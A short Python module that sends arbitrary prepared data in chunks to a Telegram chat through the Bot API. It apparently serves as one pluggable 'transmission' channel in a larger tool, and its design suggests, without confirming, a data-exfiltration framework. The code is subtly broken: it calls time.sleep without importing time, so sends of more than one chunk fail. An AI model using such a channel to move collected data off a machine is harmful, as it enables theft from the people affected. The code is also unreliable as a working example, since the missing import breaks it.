"""
Telegram Transmission Module
Sends data via Telegram Bot API
"""

import requests
import logging
from .base import BaseTransmission
from config import Config

class TelegramTransmission(BaseTransmission):
    def __init__(self):
        super().__init__()
        self.bot_token = Config.TELEGRAM_CONFIG['bot_token']
        self.chat_id = Config.TELEGRAM_CONFIG['chat_id']
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}"
        
        self.method_name = "Telegram"
        self.max_message_length = 4000
    
    def send(self, data):
        """Send data via Telegram"""
        try:
            # Prepare data
            prepared = self.prepare_data(data)
            
            # Split into chunks if needed
            chunks = [prepared[i:i+self.max_message_length] 
                     for i in range(0, len(prepared), self.max_message_length)]
            
            for i, chunk in enumerate(chunks):
                message = f"Part {i+1}/{len(chunks)}:\n{chunk}" if len(chunks) > 1 else chunk
                
                # Send message
                response = requests.post(
                    f"{self.api_url}/sendMessage",
                    params={
                        'chat_id': self.chat_id,
                        'text': message,
                        'parse_mode': 'HTML'
                    },
                    timeout=self.timeout
                )
                
                if response.status_code != 200:
                    logging.error(f"Telegram send failed: {response.text}")
                    return False
                
                # Add small delay between messages
                if len(chunks) > 1:
                    time.sleep(1)
            
            self.log_attempt(True, len(data))
            return True
            
        except Exception as e:
            self.log_attempt(False, 0)
            logging.error(f"Telegram send failed: {e}")
            return False